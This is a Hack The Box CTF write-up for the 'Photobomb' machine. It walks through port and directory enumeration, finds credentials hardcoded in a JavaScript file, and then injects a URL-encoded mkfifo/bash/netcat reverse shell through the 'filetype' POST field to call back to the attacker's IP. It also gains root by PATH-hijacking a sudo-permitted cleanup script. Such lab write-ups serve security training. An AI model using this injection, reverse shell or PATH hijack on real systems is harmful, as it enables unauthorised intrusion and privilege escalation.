---
title: Hack the Box - Writeup (Photobomb)
description: This is a walkthrought for the Photobomb CTF on Hack The Box. It
  shows how easily we can exploit an Basic HTTP Authentication.
category: Writeup
author:
  name: Farouk Mokhtari
  email: fmokhtari@mail.ru
  website: https://fmokhtari.com
  btc: 1JJmuidSTRCugnBKH8H7bDxEmTtAAg4kyn
  usdt: TWi6yNRhxzkmgZhhoriDzWgvrSsxbdQCb8
  xmr: 87Asjp2TLCkKnw3PYsiKaTDwL8mNhiL7uV67ptCtVxqbSnaZfATQ6t4d1mfWnKu4kB4ieQHMApGhUdUY3h4RKBS2Kuc5RyW
tags:
  - hackthebox
  - ctfs
date: 2022-12-12T06:30:49.237Z
---

## Introduction

Introducing this user-friendly machine that showcases the simplicity of exploiting basic HTTP Authentication. With a straightforward setup and intuitive interface, this machine provides a hands-on demonstration of how easily one can exploit this type of authentication.

## Enumeration

We run our usual nmap scan with the flags `-sC`, `-sV`

```shell
nmap -sC -sV -v -oA 10.10.11.182-full.txt 10.10.11.182
```

- `-sV` We probe for open ports to determine services/version info.
- `-sC` Scan for available scripts to our vulnerabilities.

```shell
# Nmap 7.93 scan initiated Wed Dec  7 19:50:38 2022 as: nmap -sC -sV -v -oA 10.10.11.182-full.txt 10.10.11.182
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
| http-methods:
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  7 19:50:53 2022 -- 1 IP address (1 host up) scanned in 14.63 seconds
```

2 ports open are found :

- 22 (ssh)
- 80 (http) [photobomb.htb](http://photobomb.htb/)

From now on since we can't access our IP on our web browser. As usual we add the
domain to our **/etc/hosts** file. Since we know port 80 is open, we do an
enumeration for a list of directories.

### Directories Enumeration

`gobuster` is the right tool for directory discovery, but you can use other tools like `dirbuster`

```shell
gobuster dir -w wordlist.txt -u http://photobomb.htb/ -x php,txt,html
```

We find a url pointing to this path [http://photobomb.htb/printer](http://photobomb.htb/printer) that takes us to a login session.

The login session is a Basic HTTP Authentication. After checking the page source
code we find something interesting in there. We find in this file
[photobomb.js](http://photobomb.htb/photobomb.js) what it seems to be credentials for our session.

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (
    document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)
  ) {
    document
      .getElementsByClassName("creds")[0]
      .setAttribute("href", "http://pH0t0:b0Mb!@photobomb.htb/printer");
  }
}
window.onload = init;
```

The comment in the file says it all. apparently tech support keep forgetting
the password, let's figure out how to exploit this.

## Exploitation

This is an easy one to exploit. We use a vulnerability scanner like `Burp Suite` to find the possibility to encode a reverse shell in the POST request.
We can encode this reverse shell in the URL.

```shell
 curl -X POST -u pH0t0:b0Mb! "http://photobomb.htb/printer" -d "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.78%201234%20%3E%2Ftmp%2Ff&dimensions=3000x2000"
```

By using `netcat` and listen on a specific port

```shell
nc -lnp 1234
```

- `-l` Listen for an incoming connection.
- `-n` Do not resolve domain names.
- `-p` Use specified port.

and with this, it gives us the access to the machine.

Now, we have a shell. So after getting the user flag let's try to elevate our
priviledges.

```shell
 sudo -l
```

This will list all the commands that the user can execute on the current machine.

```shell
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

## Priviledge Escalation

It means we can execute **/opt/cleanup.sh** with some environment variables as
root.

This is the content of the cleanup file.

```shell
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

Create a file named `find` with these two commands.

```shell
# First command is to create the file with a bash interactive session
echo '/bin/bash -i'>find
# Make it executable
chmod +x find
```

Run this command now.

```shell
 sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

`$PWD` is added to the `$PATH` environment variable in order to execute our
created file before the one installed in the linux machine.

You're root, now you know the drill.
